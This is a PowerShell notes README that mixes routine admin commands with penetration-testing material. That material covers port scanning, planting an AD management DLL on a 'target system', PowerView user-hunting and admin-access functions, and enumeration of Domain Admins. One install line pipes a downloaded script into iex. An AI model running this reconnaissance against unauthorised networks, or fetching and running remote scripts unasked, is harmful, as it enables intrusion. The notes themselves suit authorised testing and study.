# ![logo][] PowerShell - Scripts & Notes
[logo]: https://raw.githubusercontent.com/PowerShell/PowerShell/master/assets/ps_black_64.svg?sanitize=true
## 📝 Table of Contents
+ [About](#about)
+ [Installation](#installation)
    * [Install Chocolatey](#install-chocolatey)
    * [Install pip](#install-pip)
    * [Install Module](#install-module)
    * [Install Script](#install-script)
    * [git - Update all local repos](#git-update-all-local-repos)
    * [PowerShell Configuration](#powershell-configuration)
+ [Usage](#usage)
  + [Help Command](#help-command)
  + [General](#general)
  * [Modules](#modules)
  * [Scripts](#scripts)
  * [PowerShell Command](#powershell-command)
  * [Sort and Filter](#sort-and-filter)
  * [Reporting](#reporting)
  * [Active Directory](#active-directory)
  * [Computer Info](#computer-info)
  * [User Accounts](#user-accounts)
  * [Registry](#registry)
  * [Files](#files)
  * [netstat](#netstat)
  * [clipboard](#clipboard)
  * [Processes](#processes)
  * [Cimsession](#cimsession)
  * [Services](#services)
  * [Recon](#recon)
  * [Domain Enum](#domain-enumeration)
  * [Local Privilege Escalation](#local-privilege-escalation)
  * [Local Account Stealing](#local-account-stealing)
  * [Monitor Potential Incoming Account](#monitor-potential-incoming-account)
  * [Admin Recon](#admin-recon)
  * [Lateral Movement](#lateral-movement)
  * [Remote Administration](#remote-administration)
  * [Domain Admin Privileges](#domain-admin-privileges)
  * [Cross Trust Attacks](#cross-trust-attacks)
  * [Persistance and Exfiltrate](#persistance-and-exfiltrate)
+ [API Wrapper](#api-wrapper)
+ [Blogs](#blogs)
+ [Books](#books)
+ [Build Tools](#build-tools)
+ [Code and Package Repositories](#code-and-package-repositories)
+ [Commandline Productivity](#commandline-productivity)
+ [Communities](#Communities)
+ [Data](#Data)
+ [Documentation Helper](#documentation-helper)
+ [Editors and IDEs](#editors-and-ides)
+ [Frameworks](#frameworks)
+ [Interactive Learning](#interactive-learning)
+ [Logging](#logging)
+ [Module Development Templates](#module-development-templates)
+ [Package Managers](#package-managers)
+ [Parallel Processing](#parallel-processing)
+ [Podcasts](#podcasts)
+ [Security](#security)
+ [SharePoint](#sharepoint)
+ [SQL Server](#sql-server)
+ [Testing](#testing)
+ [Themes](#themes)
+ [UI](#ui)
+ [Videos](#videos)
+ [Webserver](#webserver)
+ [Misc](#misc)
+ [Authors](#authors)
+ [Acknowledgments](#acknowledgments)
+ [Appendix A ADUser Property List](#appendix-a-aduser-property-list)
--------------------------------------------------------------------------------------------------------------------------------------------
## 🧐 About <a name = "about"></a>
List of PowerShell Commands, Notes, Links, etc.
--------------------------------------------------------------------------------------------------------------------------------------------
## Installation
Install PowerShell and other packages <a name = "install-powershell-and-other-packages"></a>
* [Installing PowerShell on Windows](https://docs.microsoft.com/en-us/powershell/scripting/install/installing-powershell-on-windows?view=powershell-7.2)
* [PowerShell](https://docs.microsoft.com/en-us/powershell/)
* [PowerShellGet](https://github.com/PowerShell/PowerShellGet)
* [PowerShellGet - Install](https://docs.microsoft.com/en-us/powershell/module/powershellget/install-module?view=powershell-7.2)
* [Listing Windows Installer Applications](https://docs.microsoft.com/en-us/powershell/scripting/samples/working-with-software-installations?view=powershell-7.2#listing-windows-installer-applications)
* [PowerShell Gallery](https://www.powershellgallery.com/)
* [PowerShell - Documentation Search](https://docs.microsoft.com/en-us/learn/browse/?terms=PowerShell)
```powershell
Set-ExecutionPolicy Unrestricted
# If you have not configured TLS 1.2, any attempts to install the NuGet provider and other packages will fail
# Reference:
# https://docs.microsoft.com/en-us/powershell/scripting/gallery/installing-psget?view=powershell-7.2
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
# Update Help
Update-Help -Force -Verbose
Save-Help -DestinationPath "<DESTINATION_PATH>" -Force -Verbose
notepad++ (Get-PSReadLineOption | select -ExpandProperty HistorySavePath)
```
### Install Chocolatey <a name = "install-chocolatey"></a>
```powershell
Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco install advanced-ip-scanner -y --force
choco install angryip -y --force
choco install curl -y --force
choco install diff -y --force
choco install grep -y --force
choco install ip-query -y --force
choco install jupyter-powershell -y --force
choco install lansweeper -y --force
choco install man -y --force
choco install ndiff -y --force
choco install nmap -y --force
choco install oh-my-posh -y --force
choco install openssl -y --force
choco install pip -y --force
choco install pip_search -y --force
choco install poshgit -y --force
choco install pslist -y --force
choco install psreadline -y --force
choco install python2 -y --force
choco install python3 -y --force
choco install sysinternals -y --force
choco install version -y --force
choco install which -y --force
choco install zenmap -y --force
```
### Install pip <a name = "install-pip"></a>
```powershell
py -m pip install --upgrade pip --force
py -m pip install pip_search -v
py -m pip install --user pipx
py -m pip install requests
pip install *bigquery*
pip install google-cloud-bigquery
pip install google-cloud-storage
pip install --upgrade google-api-python-client
pip install --upgrade google-auth-oauthlib
pip install --upgrade google-cloud-bigquery
pip install --upgrade google-cloud-storage -v
pip install --upgrade setuptools
pip install BeautifulSoup
pip install SQLAlchemy
pip install bottle
pip install google-api-utils
pip install google-cloud
pip install google-drive-api
pip install google_documents
pip install google_spreadsheet
pip install ip-query -v
pip install jupyter-console
pip install man
pip install matplotlib 
pip install notebook
pip install numpy
pip install openpyxl
pip install pandas
pip install psreadline
pip install py2exe
pip install pyscreenshot
pip install pyserial
pip install pyusb
pip install pywin32
pip install pyxlsb
pip install uspp
pip install which
pip install xlsxwriter
pip install zenmap
```
### Install Module <a name = "install-module"></a>
```powershell
Install-Module -Name PowerShellGet -Force -Verbose
Install-Module PSReadLine -Force -Verbose
Install-Module PSScriptTools -Force -Verbose
Install-Module pester -SkipPublisherCheck -Force -Verbose
Install-Module -Name ActiveDirectoryTools -Force -Verbose
Update-Module -Verbose
Get-Module -ListAvailable -All
# Troubleshooting
# Re-registering PS default repository
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Unregister-PSRepository -Name PSGallery
Register-PSRepository -Default
Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
Find-Module ActiveDirectory -Verbose
```
### Install Script <a name = "install-script"></a>
```powershell
Install-Script -Name CertificateScanner
Install-Script -Name Download-AllGalleryModules
Install-Script -Name Get-ComputerInfo
Install-Script -Name GettingTLSVersionsFromAllComputers
Install-Script -Name PSGalleryInfo
Install-Script -Name PSGalleryModule
Install-Script -Name set-nsssl
```
### git - Update all local repos <a name = "git-update-all-local-repos"></a>
```powershell
cd <GITHUB-PROJECTS-FOLDER-PATH>
Get-ChildItem -Path "C:\github-projects" | foreach {git -C $_.FullName pull --force --all --recurse-submodules --verbose}
```
### PowerShell Configuration
```powershell
# Force PowerShell to use a more secure protocol, like TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Output the secure protocols that will be used
[Net.ServicePointManager]::SecurityProtocol
# Example of how to set "PSModulePath"
$Env:PSModulePath = $Env:PSModulePath + ";C:\Program Files\PowerShell\Modules;c:\program files\powershell\7\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files (x86)\Universal\Modules"
# Output PowerShell Module folder paths
$env:PSModulePath -split ';'
# Get PowerShell "profile.ps1" file locations
$PROFILE | Get-Member -Type NoteProperty
# Update PowerShell help files to your local system
Get-Help * -Parameter ComputerName
Update-Help -Force -Verbose
Save-Help -DestinationPath "<DESTINATION_PATH>" -Force -Verbose
# Show the help for install module, list the PS Get version to understand the paths for scope
Get-Help Install-Module
$env:PsModulePath -Split ";"
Get-Module PowerShellGet -ListAvailable
```
--------------------------------------------------------------------------------------------------------------------------------------------
## Usage
### Help Command <a name = "help-command"></a>
```powershell
# Show the help for parameter "ComputerName"
Get-Help * -Parameter ComputerName
Update-Help -Force -Verbose
Save-Help -DestinationPath "<DESTINATION_PATH>" -Force -Verbose
# Show the help for install module, list the PS Get version to understand the paths for scope
Get-Help Install-Module
$env:PsModulePath -Split ";"
Get-Module PowerShellGet -ListAvailable
# Troubleshooting
# Force PowerShell to use a more secure protocol, like TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
# Output the secure protocols that will be used
[Net.ServicePointManager]::SecurityProtocol
# Re-registering PS default repository
Unregister-PSRepository -Name PSGallery
Register-PSRepository -Default
Set-PSRepository -Name PSGallery -InstallationPolicy Trusted
Find-Module ActiveDirectory -Verbose
```
### General
```powershell
# Get-PSRepository | Format-List
```
### Modules
```powershell
# List modules loaded in to this current PowerShell session
Get-Module
# List modules that are available for use on this computer 
Get-Module -ListAvailable
# Do a Get-Module to see the ExportedCommands property to identify what commands are in a module
# Call the ExportedCommands property so it formats nicely
(Get-Module ActiveDirectory).ExportedCommands
Find-Module *install*
Find-Module -Repository PSGallery
Find-Module -Name *pip*
Find-Module nx* | Format-Table Version, Name, Description
Find-Module nx* | Install-Module -Force
Find-Module -Tag 'Active Directory', 'ActiveDirectory', 'Active', 'Directory', 'AD'
Get-Command -Name '*Process'
Get-Module -ListAvailable -All -Verbose
Get-Module -ListAvailable | where { $_.path -match "System32" }
Install-Module -Name PowerShellGet -Force -Verbose
Install-Module PSReadLine -Force -Verbose
Install-Module PSScriptTools -Force -Verbose
Install-Module pester -SkipPublisherCheck -Force -Verbose
Install-Module -Name ActiveDirectoryTools -Force -Verbose
Update-Module -Verbose
Get-Module -ListAvailable -All
```
### Scripts
```powershell
Find-Script *install*
Find-Script -Name *pip*
Install-Script -Name CertificateScanner
Install-Script -Name Download-AllGalleryModules
Install-Script -Name Get-ComputerInfo
Install-Script -Name GettingTLSVersionsFromAllComputers
Install-Script -Name PSGalleryInfo
Install-Script -Name PSGalleryModule
Install-Script -Name set-nsssl
```
### PowerShell Command
```powershell
# Get all command names locally installed
(Get-Command *).Name | Sort -Unique
# Get all command names locally installed (that start with "Get-AD")
(Get-Command *).Name | Sort -Unique | grep -i get\-ad
# Get all commands that deal with files
Get-Command -Noun File*
# Get cmdlets and functions that have an output type
Get-Command -Type Cmdlet | Where-Object OutputType | Format-List -Property Name, OutputType
Get-Command -Module PowerShellGet | Format-Wide -Column 3
Get-Command -ParameterName Cimsession
Get-Command -ParameterName ComputerName
```
### Sort and Filter
```powershell
Find-Module -Name *session* -Repository PSGallery | Sort-Object -Property Name | Format-Table -Property Name -HideTableHeaders
Get-Process | sort -Descending ws | select -First 3
$servers = Get-ADComputer -Filter * -Properties *
Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled = $true"
Get-WmiObject -Class Win32_UserAccount -Namespace "root\cimv2" -Filter "LocalAccount='$True'"
Get-ChildItem -Path C:\ -Filter *.sys -Force
Get-CimInstance -ClassName Win32_Process -Filter "Name='calculator.exe'"
Get-ChildItem hklm:\software | Get-Member ps*
# Sort by "Management*" AD Group Names
Get-ADGroup -Filter { Name -like "*Management*" } | Select-Object -Property Name | Sort-Object -Property Name -Unique
# Sort by "*admin*" AD Group Names
Get-ADGroup -Filter { Name -like "*admin*" } | Select-Object -Property Name | Sort-Object -Property Name -Unique
```
### Reporting
```powershell
# Export Excel file (with PivotChard and PivotTable, 3D Chart Type)
Get-Process | Export-Excel .\output.xlsx -WorksheetName Processes -ChartType PieExploded3D -IncludePivotChart -IncludePivotTable -Show -PivotRows Company -PivotData PM
```
### Active Directory
```powershell
# Import "ActiveDirectory" Module
try {
    Import-Module ActiveDirectory -ErrorAction Stop
} catch {
    Write-Host "Unable to import module ActiveDirectory! Ensure it is available on this system." -BackgroundColor Yellow -ForegroundColor Black
    Break
}
try {
    Import-Module GroupPolicy -ErrorAction Stop
} catch {
    Write-Host "Unable to import module GroupPolicy! Ensure it is available on this system." -BackgroundColor Yellow -ForegroundColor Black
    Break
}
# Get all the PowerShell commands that start with "Get-AD*"
(Find-Module -Name *-ad* -Repository PSGallery).Name | ForEach-Object {Get-Command -Module $_.Name} | Export-Csv -Path .\report_all-modules_with_-ad_in-name.csv -Encoding UTF8 
Get-Command -Type All | Select-Object Source  | grep -i "get-ad"
# Trust
Get-ADTrust -Filter * -Property * | Export-Csv ad-trust-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
# Forest
Get-ADForest | Export-Csv ad-forest-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
$ForestInfo = Get-ADForest -Current LocalComputer
Get-ADForest | Format-Table -Property *master*, global*, Domains
Get-ADForest google.com | Format-Table SchemaMaster,DomainNamingMaster
# Site
Get-ADSiteDetail | Export-Csv .\ad-site-detail_active-directory-details_2022-05-25.xlsx -NoTypeInformation -Encoding utf8
Get-ADSiteSummary | Export-Csv .\ad-site-summary_active-directory-details_2022-05-25.xlsx -NoTypeInformation -Encoding utf8
Get-ADObject -SearchBase (Get-ADRootDSE).ConfigurationNamingContext -filter "objectclass -eq 'site'"
# Get OU Details
Get-ADOrganizationalUnit -Filter * -Property * | Export-Csv ad-org-unit-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
Get-ADOrganizationalUnit -Filter * -Property * | Export-Csv -Append -Path .\output_get-adorganizationunit_all-properties.csv -NoTypeInformation -Encoding utf8
Get-ADOrganizationalUnit -Filter "Name –eq 'HR'")
Get-ADOrganizationalUnit -LDAPFilter "(name=Google)" -Property * | select distinguishedname
# Domain
Get-ADDomain | Export-Csv ad-domain-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
$DomainInfo = Get-ADDomain -Current LocalComputer
Show-DomainTree -Verbose
Get-ADDomain | Format-Table -Property DNS*, PDC*, *master, Replica*
Get-ADDomain google.com | format-table PDCEmulator,RIDMaster,InfrastructureMaster
$SearchBase = $DomainInfo.DistinguishedName
Add-Content -Path $LogFile -Value "Domain FQDN: $($DomainInfo.DNSRoot)"
Add-Content -Path $LogFile -Value "Domain NetBIOS: $($DomainInfo.NetBIOSName)"
Add-Content -Path $LogFile -Value "Script Reference: $($ScriptText[0].Content)"
Add-Content -Path $LogFile -Value "----------------------------------------------------"
If ($DomainInfo.DomainSID.GetType().Name -eq 'String'){
    $DomainSID = $DomainInfo.DomainSID
} Else {
    $DomainSID = ($DomainInfo | Select-Object -ExpandProperty DomainSID).Value
}
$ChildDomainStatus = foreach ($child in $DomainInfo.ChildDomains){
    If ((Test-Netconnection $child -Port 389).TcpTestSucceeded){
        New-Object -TypeName PSObject -Property @{
            DomainName = $child
            Online = $True
        }
    } Else {
        New-Object -TypeName PSObject -Property @{
            DomainName = $child
            Online = $False
        }
    }
}
# Domain Controllers
Get-ADDomainController -Filter * | Export-Csv ad-domain-controller-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
# Domain Controllers - Read-Only
$DCs = Get-ADDomainController -Filter {ISReadOnly -eq $True} -ErrorVariable ErrVar -ErrorAction SilentlyContinue | Select-Object $Properties
Get-ADDomainController -Discover -Service PrimaryDC
Get-ADObject -LDAPFilter "(objectclass=computer)" -searchbase "ou=domain controllers,dc=google,dc=com"
# ADBranch
Get-ADBranch -SearchBase "dc=<COMPANY-NAME>,dc=com" | Format-List -Property Name
# ADGroup
Get-ADGroup -Filter * -Property * | Export-Csv ad-group-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
Get-ADGroupReport -Verbose | Export-Csv ad-group-report_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
Get-ADGroup -Filter { Name -like "*admin*" }
Get-ADGroup -Filter { Name -like "*Management*" }
# ADGroupMember
# Display Group Members of the HR Team Group
Get-ADGroupMember -Identity 'HR Team' | Format-Table -Property SamAccountName, DistinguishedName
# ADUser
# "Get-ADUser"
# Get all ADUsers
Get-ADUser -Filter * -Property * | Export-Csv ad-user-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
# Get ADUser by Name
Get-ADUser -Filter 'Name -like "*John*Smith*"' -Properties * | Format-List -Property *
Get-ADUser -Identity student1 -Properties *
# Search for a particular string in a user's attributes
Find-UserField -SearchField Description -SearchTerm "built"
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
# Get list of all properties for users in the current domain
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
# Identify objects in the Active Directory (AD) Recycle Bin
# Active Directory Recycle Bin (since Windows Server 2008 R2 OS, for recovering deleted objects)
Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))"
Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))" | select Name
# ADComputer
Get-ADComputer -Filter * -Property * | Export-Csv ad-computer-list_active-directory-details_2022-05-25.csv -NoTypeInformation -Encoding utf8
Get-ADComputerReport -Verbose *>&1 | Tee-Object -FilePath "output_Get-ADComputerReport_command_2022-04-25.txt"
# "CimSession" and "CimInstance"
[PowerShell]::Create().AddCommand("Get-CimInstance").AddArgument("Win32_BIOS").Invoke()
Get-CimInstance -CimSession "localhost" -ClassName Win32_ComputerSystem -Property *
# Network Info
Get-CimInstance -ComputerName "localhost" -ClassName Win32_NetworkAdapterConfiguration -Filter "IPEnabled = 'True'" | Select-Object -Property *
# Network Info - "IPAddress" only
(Get-CimInstance -ComputerName "localhost" -ClassName Win32_NetworkAdapterConfiguration -Filter "IPEnabled = 'True'" | Select-Object -Property *).IPAddress[0]
# "logicaldisk" - Space
[Math]::Round(((Get-CimInstance win32_logicaldisk -Filter "name = 'c:'").FreeSpace / 1GB),1)
# Retrieve process information from remote system (with WMI remoting enabled)
Get-CimInstance -CimSession "localhost" -ClassName win32_process
# Retrieve service names and statuses
$session = New-CimSession -ComputerName "localhost"
$session = New-CimSession -Credential <USERNAME>\<PASSWORD> -ComputerName "localhost"
Get-CimInstance -CimSession $session -ClassName win32_service -Property name, state | sort state | ft name, state -AutoSize -HideTableHeaders -Wrap
# Retrieve BIOS information
Invoke-Command -ComputerName "localhost" -ScriptBlock {Get-CimInstance win32_bios}
# "PSSession"
$PSSession = New-PSSession -ComputerName "localhost"
$PSSession = New-PSSession -Credential <USERNAME>\<PASSWORD> -ComputerName "localhost"
Invoke-Command -Session $PSSession -ScriptBlock {gwmi win32_bios} -AsJob
# AD - Recycle Bin 
# Identify objects in the Active Directory (AD) Recycle Bin
# Active Directory Recycle Bin (since Windows Server 2008 R2 OS, for recovering deleted objects)
Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))"
Get-ADObject -IncludeDeletedObjects -LdapFilter "(&(objectClass=user))" | select Name
```
### Computer Info
```powershell
$servers = Get-ADComputer -Filter * -Properties *
# "Get-ADComputer" (with limited property value output)
Get-ADComputer -Filter * -Property 'Name','DistinguishedName','OperatingSystem','OperatingSystemServicePack','OperatingSystemVersion','IPv4Address','whenCreated','whenChanged','PasswordLastSet','userAccountControl' -ErrorVariable ErrVar -ErrorAction SilentlyContinue | Export-Csv -path OutFile.CSV -NoTypeInformation -Encoding utf8
# "Get-ADComputer" (with limited property value output, alternative)
Get-ADComputer -Filter * -Property Name,DNSHostName,Enabled,isCriticalSystemObject,ManagedBy,DisplayName,DistinguishedName,CanonicalName,ObjectCategory,ObjectClass,ObjectSID,OperatingSystem,OperatingSystemServicePack,OperatingSystemVersion,IPv4Address,Description,DisplayName,whenCreated,whenChanged,PasswordLastSet,userAccountControl,MemberOf,PrimaryGroup,adminCount -ErrorVariable ErrVar -ErrorAction SilentlyContinue | Export-Csv -Path OutFile.CSV -NoTypeInformation -Encoding utf8
# Alternative Way
Get-ADObject -LDAPFilter "(objectclass=computer)" -searchbase "dc=google,dc=com" -Verbose -Property * | Export-Csv -Path .\report_get-adobject_of-type-computer_from_google-com-domain_all-computers.csv -Encoding utf8
Get-ADComputer -Identity "<HOSTNAME>" -Properties * -Verbose
Get-ComputerInfo -Property "*version"
Write-Host $env:COMPUTERNAME
Get-CimClass -ClassName *bios*
Get-CimClass -ClassName Win32_Bios
Get-CimInstance -ClassName Win32_Bios
Get-CimInstance -ClassName Win32_OperatingSystem
Get-CimInstance -ClassName Win32_NetworkAdapterConfiguration -Filter "DHCPEnabled = $true"
Get-CimInstance -Query "SELECT * FROM Win32_NetworkAdapterConfiguration WHERE DHCPEnabled = $true"
Get-CimInstance -ClassName Win32_Environment
Get-Help * -Parameter ComputerName
Get-Command -ParameterName ComputerName
Get-ChildItem hklm:\software | Get-Member ps*
Get-Process | sort -Descending ws | select -First 3
Get-Process | where Handles -gt 1000
```
### User Accounts
```powershell
Get-WmiObject -Class Win32_UserAccount -Namespace "root\cimv2" -Filter "LocalAccount='$True'"
```
### Registry
```powershell
cd hklm:\software\microsoft\powershell
Get-ChildItem -Path Registry::
Get-ChildItem -Path registry::HKEY_CURRENT_CONFIG\System\CurrentControlSet\SERVICES\TSDDD\
```
### Files
```powershell
Get-ChildItem -Path C:\ -Filter *.sys -Force
# Unblock files (to allow script files to be ran in PowerShell terminal)
Get-ChildItem -Recurse | Unblock-File
```
### netstat
```powershell
netstat -n | select -Skip 4 | ConvertFrom-String -PropertyNames Blank, Protocol, LocalAddress, ForeignAddress, State | Select-Object Protocol, LocalAddress, ForeignAddress, State
```
### clipboard
```powershell
Get-Clipboard
```
### Processes
```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = 'calc.exe'}
Get-CimInstance -ClassName Win32_Process -Filter "Name='calculator.exe'"
```
### Cimsession
```powershell
Get-Command -ParameterName Cimsession
```
### Services
```powershell
Get-Service -Name BITS
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Recon
#### POWERSHELL SCAN
TODO - Add Notes
#### PORT SCAN
```powershell
Import-Module Invoke-Portscan.ps1
<#
Invoke-Portscan -Hosts "websrv.domain.local,wsus.domain.local,apps.domain.local" -TopPorts 50
echo websrv.domain.local | Invoke-Portscan -oG test.gnmap -f -ports "80,443,8080"
Invoke-Portscan -Hosts 172.16.0.0/24 -T 4 -TopPorts 25 -oA localnet
#>
```
#### AD MODULE WITHOUT RSAT
The secret to being able to run AD enumeration commands from the AD Powershell module on a system without RSAT installed, is the DLL located in <b>C:\Windows\Microsoft\.NET\assembly\GAC_64\Microsoft.ActiveDirectory.Management</b> on a system that has the RSAT installed.
Set up your AD VM, install RSAT, extract the dll and drop it to the target system used to enumerate the active directory.
```powershell
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Get-Command get-adcom*
```
#### GENERAL FUNCTIONS OF POWERVIEW
##### Misc Functions:
```powershell
Export-PowerViewCSV             #  thread-safe CSV append
Set-MacAttribute                #  Sets MAC attributes for a file based on another file or input (from Powersploit)
Copy-ClonedFile                 #  copies a local file to a remote location, matching MAC properties
Get-IPAddress                   #  resolves a hostname to an IP
Test-Server                     #  tests connectivity to a specified server
Convert-NameToSid               #  converts a given user/group name to a security identifier (SID)
Convert-SidToName               #  converts a security identifier (SID) to a group/user name
Convert-NT4toCanonical          #  converts a user/group NT4 name (i.e. dev/john) to canonical format
Get-Proxy                       #  enumerates local proxy settings
Get-PathAcl                     #  get the ACLs for a local/remote file path with optional group recursion
Get-UserProperty                #  returns all properties specified for users, or a set of user:prop names
Get-ComputerProperty            #  returns all properties specified for computers, or a set of computer:prop names
Find-InterestingFile            #  search a local or remote path for files with specific terms in the name
Invoke-CheckLocalAdminAccess    #  check if the current user context has local administrator access to a specified host
Get-DomainSearcher              #  builds a proper ADSI searcher object for a given domain
Get-ObjectAcl                   #  returns the ACLs associated with a specific active directory object
Add-ObjectAcl                   #  adds an ACL to a specified active directory object
Get-LastLoggedOn                #  return the last logged on user for a target host
Get-CachedRDPConnection         #  queries all saved RDP connection entries on a target host
Invoke-ACLScanner               #  enumerate -1000+ modifable ACLs on a specified domain
Get-GUIDMap                     #  returns a hash table of current GUIDs -> display names
Get-DomainSID                   #  return the SID for the specified domain
Invoke-ThreadedFunction         #  helper that wraps threaded invocation for other functions
```
##### net * Functions:
```powershell
Get-NetDomain                   #  gets the name of the current user's domain
Get-NetForest                   #  gets the forest associated with the current user's domain
Get-NetForestDomain             #  gets all domains for the current forest
Get-NetDomainController         #  gets the domain controllers for the current computer's domain
Get-NetUser                     #  returns all user objects, or the user specified (wildcard specifiable)
Add-NetUser                     #  adds a local or domain user
Get-NetComputer                 #  gets a list of all current servers in the domain
Get-NetPrinter                  #  gets an array of all current computers objects in a domain
Get-NetOU                       #  gets data for domain organization units
Get-NetSite                     #  gets current sites in a domain
Get-NetSubnet                   #  gets registered subnets for a domain
Get-NetGroup                    #  gets a list of all current groups in a domain
Get-NetGroupMember              #  gets a list of all current users in a specified domain group
Get-NetLocalGroup               #  gets the members of a localgroup on a remote host or hosts
Add-NetGroupUser                #  adds a local or domain user to a local or domain group
Get-NetFileServer               #  get a list of file servers used by current domain users
Get-DFSshare                    #  gets a list of all distribute file system shares on a domain
Get-NetShare                    #  gets share information for a specified server
Get-NetLoggedon                 #  gets users actively logged onto a specified server
Get-NetSession                  #  gets active sessions on a specified server
Get-NetRDPSession               #  gets active RDP sessions for a specified server (like qwinsta)
Get-NetProcess                  #  gets the remote processes and owners on a remote server
Get-UserEvent                   #  returns logon or TGT events from the event log for a specified host
Get-ADObject                    #  takes a domain SID and returns the user, group, or computer object associated with it
Set-ADObject                    #  takes a SID, name, or SamAccountName to query for a specified  domain object, and then sets a pecified 'PropertyName' to a specified 'PropertyValue'
```
##### GPO functions:
```powershell
Get-GptTmpl                     #  parses a GptTmpl.inf to a custom object
Get-NetGPO                      #  gets all current GPOs for a given domain
Get-NetGPOGroup                 #  gets all GPOs in a domain that set "Restricted Groups" on on target machines
Find-GPOLocation                #  takes a user/group and makes machines they have effectiverights over through GPO enumeration and correlation
Find-GPOComputerAdmin           #  takes a computer and determines who has admin rights over itthrough GPO enumeration
Get-DomainPolicy                #  returns the default domain or DC policy
```
##### User-Hunting Functions:
```powershell
Invoke-UserHunter               #  finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines
Invoke-StealthUserHunter        #  finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users
Invoke-ProcessHunter            #  hunts for processes with a specific name or owned by a specific user on domain machines
Invoke-UserEventHunter          #  hunts for user logon events in domain controller event logs
```
##### Domain Trust Functions:
```powershell
Get-NetDomainTrust              #  gets all trusts for the current user's domain
Get-NetForestTrust              #  gets all trusts for the forest associated with the current user's domain
Find-ForeignUser                #  enumerates users who are in groups outside of their principal domain
Find-ForeignGroup               #  enumerates all the members of a domain's groups and finds users that are outside of the queried domain
Invoke-MapDomainTrust           #  try to build a relational mapping of all domain trusts
```
##### MetaFunctions:
```powershell
Invoke-ShareFinder              #  finds (non-standard) shares on hosts in the local domain
Invoke-FileFinder               #  finds potentially sensitive files on hosts in the local domain
Find-LocalAdminAccess           #  finds machines on the domain that the current user has local admin access to
Find-ManagedSecurityGroups      #  searches for active directory security groups which are managed and identify users who have write access to
                                #  those groups (i.e. the ability to add or remove members)
Find-UserField                  #  searches a user field for a particular term
Find-ComputerField              #  searches a computer field for a particular term
Get-ExploitableSystem           #  finds systems likely vulnerable to common exploits
Invoke-EnumerateLocalAdmin      #  enumerates members of the local Administrators groups across all machines in the domain
```
--------------------------------------------------------------------------------------------------------------------------------------------
### Domain Enumeration
#### Domain
- Get current domain
```powershell
Get-NetDomain (PowerView)
Get-ADDomain (ActiveDirectory Module)
```
- Get object of another domain
```powershell
Get-NetDomain -Domain domain.local
Get-ADDomain -Identity domain.local
```
- Get domain SID for the current domain
```powershell
Get-DomainSID
(Get-ADDomain).DomainSID
```
- Get domain policy for the current domain
```powershell
Get-DomainPolicy
(Get-DomainPolicy)."system access"
```
- Get domain policy for another domain
```powershell
(Get-DomainPolicy -domain domain.local)."system access"
```
- Get domain controllers for the current domain
```powershell
Get-NetDomainController
Get-ADDomainController
```
- Get domain controllers for another domain
```powershell
Get-NetDomainController -Domain domain.local
Get-ADDomainController -DomainName domain.local -Discover
```
---
#### NETUSER
- Get a list of users in the current domain
```powershell
Get-NetUser
Get-NetUser -Username student1
Get-NetUser | select -ExpandProperty samaccountname
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity student1 -Properties *
```
- Get list of all properties for users in the current domain
```powershell
Get-UserProperty
Get-UserProperty -Properties pwdlastset
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```
- Search for a particular string in a user's attributes
```powershell
Find-UserField -SearchField Description -SearchTerm "built"
Get-ADUser -Filter 'Description -like "*built*"' -Properties Description | select name,Description
```
---
#### NETGROUP
- Get a list of computers in the current domain
```powershell
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -Ping
Get-NetComputer -FullData
Get-ADComputer -Filter * | select Name Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
```
- Get all the groups in the current domain
```powershell
Get-NetGroup
Get-NetGroup -Domain <targetdomain>
Get-NetGroup -FullData
Get-ADGroup -Filter * | select Name
Get-ADGroup -Filter * -Properties *
```
- Get all groups containing the word "admin" in group name
```powershell
Get-NetGroup *admin*
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```
- Get all the members of the Domain Admins group
```powershell
Get-NetGroupMember -GroupName "Domain Admins" -Recurse
Get-ADGroupMember -Identity "Domain Admins" -Recursive
Get-NetGroupMember -GroupName "Enterprise Admins" -Domain target.local
```
- Get the group membership for a user
```powershell
Get-NetGroup -UserName "john"
